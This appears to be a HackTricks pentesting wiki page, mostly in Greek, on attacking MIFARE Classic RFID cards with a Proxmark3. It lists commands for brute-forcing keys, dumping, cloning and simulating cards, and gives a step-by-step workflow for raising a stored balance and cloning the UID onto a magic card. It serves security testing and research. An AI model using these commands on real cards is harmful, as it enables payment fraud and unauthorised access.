# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Επίθεση σε RFID συστήματα με Proxmark3

Το πρώτο πράγμα που πρέπει να κάνετε είναι να έχετε ένα [**Proxmark3**](https://proxmark.com) και να [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Επίθεση σε MIFARE Classic 1KB

Έχει **16 sectors**, κάθε ένα από αυτά έχει **4 blocks** και κάθε block περιέχει **16B**. Το UID είναι στο sector 0 block 0 (και δεν μπορεί να αλλαχθεί).\
Για να αποκτήσετε πρόσβαση σε κάθε sector χρειάζεστε **2 keys** (**A** και **B**) που αποθηκεύονται στο **block 3 of each sector** (sector trailer). Το sector trailer αποθηκεύει επίσης τα **access bits** που δίνουν τα δικαιώματα **read and write** σε **each block** χρησιμοποιώντας τα 2 keys.\
Τα 2 keys είναι χρήσιμα για να δώσουν δικαιώματα ανάγνωσης αν γνωρίζετε το πρώτο και εγγραφής αν γνωρίζετε το δεύτερο (για παράδειγμα).

Πολλές επιθέσεις μπορούν να πραγματοποιηθούν
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. Σε αυτήν την κάρτα μπορείτε απλά να sniff την επικοινωνία και να υπολογίσετε το χρησιμοποιημένο κλειδί επειδή οι **χρησιμοποιούμενες κρυπτογραφικές λειτουργίες είναι αδύναμες** και γνωρίζοντας το απλό και το κρυπτογραφημένο κείμενο μπορείτε να το υπολογίσετε (`mfkey64` tool).

#### MiFare Classic quick workflow for stored-value abuse

Όταν τα terminals αποθηκεύουν υπόλοιπα σε Classic κάρτες, μια τυπική end-to-end ροή είναι:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Σημειώσεις

- `hf mf autopwn` ορχηστρώνει nested/darkside/HardNested-style attacks, ανακτά κλειδιά και δημιουργεί dumps στον φάκελο client dumps.
- Η εγγραφή του block 0/UID λειτουργεί μόνο σε magic gen1a/gen2 κάρτες. Οι κανονικές Classic κάρτες έχουν UID μόνο για ανάγνωση.
- Πολλές υλοποιήσεις χρησιμοποιούν Classic "value blocks" ή απλούς checksums. Βεβαιώσου ότι όλα τα διπλότυπα/συμπληρωματικά πεδία και τα checksums είναι συνεπή μετά την επεξεργασία.

See a higher-level methodology and mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Ακατέργαστες Εντολές

Τα συστήματα IoT μερικές φορές χρησιμοποιούν **μη επωνυμικά ή μη εμπορικά tags**. Σε αυτή την περίπτωση, μπορείς να χρησιμοποιήσεις το Proxmark3 για να στείλεις προσαρμοσμένες **raw commands στα tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Με αυτές τις πληροφορίες μπορείτε να προσπαθήσετε να αναζητήσετε πληροφορίες για την κάρτα και για τον τρόπο επικοινωνίας μαζί της. Το Proxmark3 επιτρέπει την αποστολή raw εντολών όπως: `hf 14a raw -p -b 7 26`

### Σενάρια

Το λογισμικό Proxmark3 περιλαμβάνει μια προφορτωμένη λίστα με **σενάρια αυτοματισμού** που μπορείτε να χρησιμοποιήσετε για να εκτελέσετε απλές εργασίες. Για να λάβετε την πλήρη λίστα, χρησιμοποιήστε την εντολή `script list`. Στη συνέχεια, χρησιμοποιήστε την εντολή `script run`, ακολουθούμενη από το όνομα του script:
```
proxmark3> script run mfkeys
```
Μπορείτε να δημιουργήσετε ένα script για **fuzz tag readers**, οπότε, για να αντιγράψετε τα δεδομένα μιας **valid card** απλά γράψτε ένα **Lua script** που **randomize** ένα ή περισσότερα τυχαία **bytes** και ελέγξτε αν ο **reader crashes** σε κάποια επανάληψη.

## Αναφορές

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
